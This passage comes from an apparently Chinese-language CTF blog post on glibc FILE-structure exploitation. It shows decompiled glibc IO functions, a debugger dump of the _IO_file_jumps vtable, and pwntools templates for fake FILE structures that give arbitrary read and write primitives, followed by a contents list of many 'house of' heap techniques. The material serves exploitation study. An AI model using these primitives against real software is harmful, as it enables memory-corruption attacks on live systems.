rdx</span></span><br><span class="line"></span><br><span class="line">  v5 = n;</span><br><span class="line">  <span class="keyword">while</span> ( v5 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (f-&gt;_flags2 &amp; <span class="number">2</span>) != <span class="number">0</span> )</span><br><span class="line">      v6 = _GI___write_nocancel(f-&gt;_fileno, data, v5);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v6 = _GI___libc_write(f-&gt;_fileno, data, v5);</span><br><span class="line">    <span class="keyword">if</span> ( v6 &lt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= <span class="number">0x20</span>u;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v5 -= v6;</span><br><span class="line">    data = (<span class="type">char</span> *)data + v6;</span><br><span class="line">  &#125;</span><br><span class="line">  result = n - v5;</span><br><span class="line">  offset = f-&gt;_offset;</span><br><span class="line">  <span class="keyword">if</span> ( offset &gt;= <span class="number">0</span> )</span><br><span class="line">    f-&gt;_offset = result + offset;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>从而可以构造<code>write primitive</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">fake_io_write = fit(&#123;</span><br><span class="line">    0x00: 0x8000 | 0x800 | 0x1000, #_flags</span><br><span class="line">    0x20: write_addr, #_IO_write_base</span><br><span class="line">    0x28: write_addr + len, #_IO_write_ptr</span><br><span class="line">    0x68: next_FILE, #_chain</span><br><span class="line">    0x70: 1, # _fileno</span><br><span class="line">    0xc0: 0, #_modes</span><br><span class="line">    0xd8: _IO_file_jumps, #_vtables</span><br><span class="line">&#125;, filler=b&#x27;\x00&#x27;)</span><br></pre></td></tr></table></figure>
<h3 id="任意读-1"><a href="#任意读-1" class="headerlink" title="任意读"></a>任意读</h3><p><code>read primitive</code>需要知道<code>_IO_file_jumps</code>长啥样</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">00:0000│  0x7ffff7dbe450 (_IO_file_jumps) ◂— 0x0</span><br><span class="line">01:0008│  0x7ffff7dbe458 (_IO_file_jumps+8) ◂— 0x0</span><br><span class="line">02:0010│  0x7ffff7dbe460 (_IO_file_jumps+16) —▸ 0x7ffff7c78739 (__SI_IO_new_file_finish_3) ◂— endbr64 &lt;-</span><br><span class="line">03:0018│  0x7ffff7dbe468 (_IO_file_jumps+24) —▸ 0x7ffff7c791c3 (__SI_IO_new_file_overflow_8) ◂— endbr64  &lt;-</span><br><span class="line">04:0020│  0x7ffff7dbe470 (_IO_file_jumps+32) —▸ 0x7ffff7c78df2 (__SI_IO_new_file_underflow_10) ◂— endbr64 </span><br><span class="line">05:0028│  0x7ffff7dbe478 (_IO_file_jumps+40) —▸ 0x7ffff7c7ae8f (_IO_default_uflow) ◂— endbr64 </span><br><span class="line">06:0030│  0x7ffff7dbe480 (_IO_file_jumps+48) —▸ 0x7ffff7c7bc72 (_IO_default_pbackfail) ◂— endbr64 </span><br><span class="line">07:0038│  0x7ffff7dbe488 (_IO_file_jumps+56) —▸ 0x7ffff7c79b8f (__SI_IO_new_file_xsputn_12) ◂— endbr64 </span><br><span class="line">08:0040│  0x7ffff7dbe490 (_IO_file_jumps+64) —▸ 0x7ffff7c79d53 (__GI__IO_file_xsgetn) ◂— endbr64 </span><br><span class="line">09:0048│  0x7ffff7dbe498 (_IO_file_jumps+72) —▸ 0x7ffff7c794d7 (__SI_IO_new_file_seekoff_9) ◂— endbr64 </span><br><span class="line">0a:0050│  0x7ffff7dbe4a0 (_IO_file_jumps+80) —▸ 0x7ffff7c7b18d (_IO_default_seekpos) ◂— endbr64 </span><br><span class="line">0b:0058│  0x7ffff7dbe4a8 (_IO_file_jumps+88) —▸ 0x7ffff7c78d38 (__SI_IO_new_file_setbuf_6) ◂— endbr64 </span><br><span class="line">0c:0060│  0x7ffff7dbe4b0 (_IO_file_jumps+96) —▸ 0x7ffff7c7939a (__SI_IO_new_file_sync_7) ◂— endbr64 </span><br><span class="line">0d:0068│  0x7ffff7dbe4b8 (_IO_file_jumps+104) —▸ 0x7ffff7c6c7d3 (_IO_file_doallocate) ◂— endbr64 </span><br><span class="line">0e:0070│  0x7ffff7dbe4c0 (_IO_file_jumps+112) —▸ 0x7ffff7c79a75 (_IO_file_read) ◂— endbr64 &lt;-</span><br><span class="line">0f:0078│  0x7ffff7dbe4c8 (_IO_file_jumps+120) —▸ 0x7ffff7c79b0b (__SI_IO_new_file_write_11) ◂— endbr64 &lt;-</span><br><span class="line">10:0080│  0x7ffff7dbe4d0 (_IO_file_jumps+128) —▸ 0x7ffff7c79a9a (_IO_file_seek) ◂— endbr64 </span><br><span class="line">11:0088│  0x7ffff7dbe4d8 (_IO_file_jumps+136) —▸ 0x7ffff7c79af6 (_IO_file_close) ◂— endbr64 </span><br><span class="line">12:0090│  0x7ffff7dbe4e0 (_IO_file_jumps+144) —▸ 0x7ffff7c79aaf (_IO_file_stat) ◂— endbr64 </span><br><span class="line">13:0098│  0x7ffff7dbe4e8 (_IO_file_jumps+152) —▸ 0x7ffff7c7bdd2 (_IO_default_showmanyc) ◂— endbr64</span><br></pre></td></tr></table></figure>
<p>在<code>write primitive</code>中我们调用了<code>_IO_new_file_overflow</code>和其中的<code>_IO_new_file_write</code>，对应偏移<code>0x18</code>和<code>0x78</code></p>
<p>在<code>read primitive</code>中我们通过将<code>_vtables</code>减去<code>0x8</code>，也就能调用<code>_IO_new_file_finish</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">IO_new_file_finish</span><span class="params">(FILE_0 *fp, <span class="type">int</span> dummy)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rbp</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( fp-&gt;_fileno != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( fp-&gt;_mode &lt;= <span class="number">0</span> )</span><br><span class="line">      IO_new_do_write(fp, fp-&gt;_IO_write_base, fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      _GI__IO_wdo_write(</span><br><span class="line">        fp,</span><br><span class="line">        fp-&gt;_wide_data-&gt;_IO_write_base,</span><br><span class="line">        fp-&gt;_wide_data-&gt;_IO_write_ptr - fp-&gt;_wide_data-&gt;_IO_write_base);</span><br><span class="line">    <span class="keyword">if</span> ( (fp-&gt;_flags &amp; <span class="number">0x40</span>) == <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = *(_QWORD *)&amp;fp[<span class="number">1</span>]._flags;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)(v2 - (_QWORD)_io_vtables) &gt; <span class="number">0x92F</span> )</span><br><span class="line">        IO_vtable_check();</span><br><span class="line">      (*(<span class="type">void</span> (__fastcall **)(FILE_0 *))(v2 + <span class="number">0x88</span>))(fp);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  _GI__IO_default_finish(fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>恰巧里面刚好也有<code>_IO_new_do_write</code>，由于它是通过<code>_vtables + 0x78</code>调用函数，所以实际调用<code>_IO_file_read</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> __fastcall _GI__IO_file_read(FILE_0 *fp, <span class="type">void</span> *buf, <span class="type">ssize_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( (fp-&gt;_flags2 &amp; <span class="number">2</span>) != <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> _GI___read_nocancel(fp-&gt;_fileno, buf, size);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> _GI___libc_read(fp-&gt;_fileno, buf, size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>从而能得出<code>read primitive</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">fake_io_read = fit(&#123;</span><br><span class="line">    0x00: 0x8000 | 0x40 | 0x1000, #_flags</span><br><span class="line">    0x20: read_addr, #_IO_write_base</span><br><span class="line">    0x28: read_addr + len, #_IO_write_ptr</span><br><span class="line">    0x68: next_FILE, #_chain</span><br><span class="line">    0x70: 0, # _fileno</span><br><span class="line">    0xc0: 0, #_modes</span><br><span class="line">    0xd8: _IO_file_jumps - 0x8, #_vtables</span><br><span class="line">&#125;, filler=b&#x27;\x00&#x27;)</span><br></pre></td></tr></table></figure>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-einherjar"><span class="toc-number">1.</span> <span class="toc-text">house of einherjar</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%A6%81"><span class="toc-number">1.1.</span> <span class="toc-text">概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-29%E6%96%B0%E9%99%90%E5%88%B6"><span class="toc-number">1.3.</span> <span class="toc-text">2.29新限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">1.4.</span> <span class="toc-text">例题</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-force"><span class="toc-number">2.</span> <span class="toc-text">house of force</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%A6%81-1"><span class="toc-number">2.1.</span> <span class="toc-text">概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-1"><span class="toc-number">2.2.</span> <span class="toc-text">原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B1"><span class="toc-number">2.2.1.</span> <span class="toc-text">示例1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B2"><span class="toc-number">2.2.2.</span> <span class="toc-text">示例2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-31%E6%96%B0%E9%99%90%E5%88%B6"><span class="toc-number">2.3.</span> <span class="toc-text">2.31新限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%981"><span class="toc-number">2.4.</span> <span class="toc-text">例题1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%982"><span class="toc-number">2.5.</span> <span class="toc-text">例题2</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-lore"><span class="toc-number">3.</span> <span class="toc-text">house of lore</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%A6%81-2"><span class="toc-number">3.1.</span> <span class="toc-text">概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-2"><span class="toc-number">3.2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B"><span class="toc-number">3.3.</span> <span class="toc-text">示例</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-orange"><span class="toc-number">4.</span> <span class="toc-text">house of orange</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%A6%81-3"><span class="toc-number">4.1.</span> <span class="toc-text">概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-3"><span class="toc-number">4.2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98-1"><span class="toc-number">4.3.</span> <span class="toc-text">例题</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-rabbit"><span class="toc-number">5.</span> <span class="toc-text">house of rabbit</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%A6%81-4"><span class="toc-number">5.1.</span> <span class="toc-text">概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-4"><span class="toc-number">5.2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98-2"><span class="toc-number">5.3.</span> <span class="toc-text">例题</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-roman"><span class="toc-number">6.</span> <span class="toc-text">house of roman</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%A6%81-5"><span class="toc-number">6.1.</span> <span class="toc-text">概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-5"><span class="toc-number">6.2.</span> <span class="toc-text">原理</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-pig"><span class="toc-number">7.</span> <span class="toc-text">house of pig</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%A6%81-6"><span class="toc-number">7.1.</span> <span class="toc-text">概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-6"><span class="toc-number">7.2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98-3"><span class="toc-number">7.3.</span> <span class="toc-text">例题</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#House-of-Corrosion"><span class="toc-number">8.</span> <span class="toc-text">House of Corrosion</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%A6%81-7"><span class="toc-number">8.1.</span> <span class="toc-text">概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-7"><span class="toc-number">8.2.</span> <span class="toc-text">原理</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-spirit"><span class="toc-number">9.</span> <span class="toc-text">house of spirit</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%A6%81-8"><span class="toc-number">9.1.</span> <span class="toc-text">概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-8"><span class="toc-number">9.2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B-1"><span class="toc-number">9.3.</span> <span class="toc-text">示例</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-kiwi"><span class="toc-number">10.</span> <span class="toc-text">house of kiwi</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%A6%81-9"><span class="toc-number">10.1.</span> <span class="toc-text">概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-9"><span class="toc-number">10.2.</span> <span class="toc-text">原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#malloc-assert"><span class="toc-number">10.2.1.</span> <span class="toc-text">__malloc_assert</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B-2"><span class="toc-number">10.3.</span> <span class="toc-text">示例</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-storm"><span class="toc-number">11.</span> <span class="toc-text">house of storm</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%A6%81-10"><span class="toc-number">11.1.</span> <span class="toc-text">概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-10"><span class="toc-number">11.2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B-3"><span class="toc-number">11.3.</span> <span class="toc-text">示例</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-banana"><span class="toc-number">12.</span> <span class="toc-text">house of banana</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%A6%81-11"><span class="toc-number">12.1.</span> <span class="toc-text">概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-11"><span class="toc-number">12.2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B-4"><span class="toc-number">12.3.</span> <span class="toc-text">示例</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF1-poc"><span class="toc-number">12.3.1.</span> <span class="toc-text">思路1-poc:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF2-poc"><span class="toc-number">12.3.2.</span> <span class="toc-text">思路2-poc:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98-4"><span class="toc-number">12.4.</span> <span class="toc-text">例题</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-emma"><span class="toc-number">13.</span> <span class="toc-text">house of emma</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%A6%81-12"><span class="toc-number">13.1.</span> <span class="toc-text">概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-12"><span class="toc-number">13.2.</span> <span class="toc-text">原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E6%93%8D%E5%8F%AF%E8%83%BD%E7%9A%84%E9%97%AE%E9%A2%98"><span class="toc-number">13.2.1.</span> <span class="toc-text">实操可能的问题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98-5"><span class="toc-number">13.3.</span> <span class="toc-text">例题</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-cat"><span class="toc-number">14.</span> <span class="toc-text">house of cat</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%A6%81-13"><span class="toc-number">14.1.</span> <span class="toc-text">概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-13"><span class="toc-number">14.2.</span> <span class="toc-text">原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#vtable%E6%A3%80%E6%9F%A5"><span class="toc-number">14.2.1.</span> <span class="toc-text">vtable检查</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#malloc-assert%E4%B8%8EFSOP"><span class="toc-number">14.2.2.</span> <span class="toc-text">__malloc_assert与FSOP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E7%A7%8D%E5%8F%AF%E8%A1%8C%E7%9A%84IO%E8%B0%83%E7%94%A8%E9%93%BE"><span class="toc-number">14.2.3.</span> <span class="toc-text">一种可行的IO调用链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fake-IO%E7%BB%93%E6%9E%84%E4%BD%93%E9%9C%80%E8%A6%81%E7%BB%95%E8%BF%87%E7%9A%84%E6%A3%80%E6%B5%8B"><span class="toc-number">14.2.4.</span> <span class="toc-text">fake_IO结构体需要绕过的检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="toc-number">14.2.5.</span> <span class="toc-text">攻击流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF"><span class="toc-number">14.2.6.</span> <span class="toc-text">模板</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98-6"><span class="toc-number">14.3.</span> <span class="toc-text">例题</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-apple1"><span class="toc-number">15.</span> <span class="toc-text">house of apple1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%A6%81-14"><span class="toc-number">15.1.</span> <span class="toc-text">概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-14"><span class="toc-number">15.2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">15.3.</span> <span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF%E4%B8%80%EF%BC%9A%E4%BF%AE%E6%94%B9tcache%E7%BA%BF%E7%A8%8B%E5%8F%98%E9%87%8F"><span class="toc-number">15.3.1.</span> <span class="toc-text">思路一：修改tcache线程变量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF%E4%BA%8C%EF%BC%9A%E4%BF%AE%E6%94%B9mp-%E7%BB%93%E6%9E%84%E4%BD%93"><span class="toc-number">15.3.2.</span> <span class="toc-text">思路二：修改mp_结构体</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF%E4%B8%89%EF%BC%9A%E4%BF%AE%E6%94%B9pointer-guard%E7%BA%BF%E7%A8%8B%E5%8F%98%E9%87%8F%E4%B9%8Bhouse-of-emma"><span class="toc-number">15.3.3.</span> <span class="toc-text">思路三：修改pointer_guard线程变量之house of emma</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF%E5%9B%9B%EF%BC%9A%E4%BF%AE%E6%94%B9global-max-fast%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F"><span class="toc-number">15.3.4.</span> <span class="toc-text">思路四：修改global_max_fast全局变量</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98-7"><span class="toc-number">15.4.</span> <span class="toc-text">例题</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-apple2"><span class="toc-number">16.</span> <span class="toc-text">house of apple2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%A6%81-15"><span class="toc-number">16.1.</span> <span class="toc-text">概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-15"><span class="toc-number">16.2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-1"><span class="toc-number">16.3.</span> <span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-IO-wfile-overflow%E5%87%BD%E6%95%B0%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%89%A7%E8%A1%8C%E6%B5%81"><span class="toc-number">16.3.1.</span> <span class="toc-text">利用_IO_wfile_overflow函数控制程序执行流</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-IO-wfile-underflow-mmap%E5%87%BD%E6%95%B0%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%89%A7%E8%A1%8C%E6%B5%81"><span class="toc-number">16.3.2.</span> <span class="toc-text">利用_IO_wfile_underflow_mmap函数控制程序执行流</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-IO-wdefault-xsgetn%E5%87%BD%E6%95%B0%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%89%A7%E8%A1%8C%E6%B5%81"><span class="toc-number">16.3.3.</span> <span class="toc-text">利用_IO_wdefault_xsgetn函数控制程序执行流</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B-5"><span class="toc-number">16.4.</span> <span class="toc-text">示例</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-apple3"><span class="toc-number">17.</span> <span class="toc-text">house of apple3</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%A6%81-16"><span class="toc-number">17.1.</span> <span class="toc-text">概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-16"><span class="toc-number">17.2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-2"><span class="toc-number">17.3.</span> <span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-IO-wfile-underflow%E5%87%BD%E6%95%B0%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%89%A7%E8%A1%8C%E6%B5%81"><span class="toc-number">17.3.1.</span> <span class="toc-text">利用_IO_wfile_underflow函数控制程序执行流</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-IO-wfile-underflow-mmap%E5%87%BD%E6%95%B0%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%89%A7%E8%A1%8C%E6%B5%81-1"><span class="toc-number">17.3.2.</span> <span class="toc-text">利用_IO_wfile_underflow_mmap函数控制程序执行流</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-IO-wdo-write%E5%87%BD%E6%95%B0%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%89%A7%E8%A1%8C%E6%B5%81"><span class="toc-number">17.3.3.</span> <span class="toc-text">利用_IO_wdo_write函数控制程序执行流</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-IO-wfile-sync%E5%87%BD%E6%95%B0%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%89%A7%E8%A1%8C%E6%B5%81"><span class="toc-number">17.3.4.</span> <span class="toc-text">使用_IO_wfile_sync函数控制程序执行流</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B-6"><span class="toc-number">17.4.</span> <span class="toc-text">示例</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-botcake"><span class="toc-number">18.</span> <span class="toc-text">house of botcake</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%A6%81-17"><span class="toc-number">18.1.</span> <span class="toc-text">概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-17"><span class="toc-number">18.2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B-7"><span class="toc-number">18.3.</span> <span class="toc-text">示例</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-husk"><span class="toc-number">19.</span> <span class="toc-text">house of 